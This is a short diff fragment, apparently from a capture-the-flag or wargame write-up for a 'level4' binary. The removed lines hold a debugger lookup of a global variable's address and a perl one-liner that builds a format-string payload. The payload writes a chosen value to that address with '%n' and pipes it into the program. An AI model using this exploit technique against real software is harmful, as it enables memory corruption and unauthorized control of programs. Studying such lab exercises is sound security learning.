@@ -1,8 +1,0 @@
-info variable
-```
-[...]
-0x08049810  m
-[...]
-```
-
-perl -e 'print "\x10\x98\x04\x08" . "%16930112d" . "%12\$n" . "\n"' > /tmp/level4 && cat /tmp/level4 | ./level4
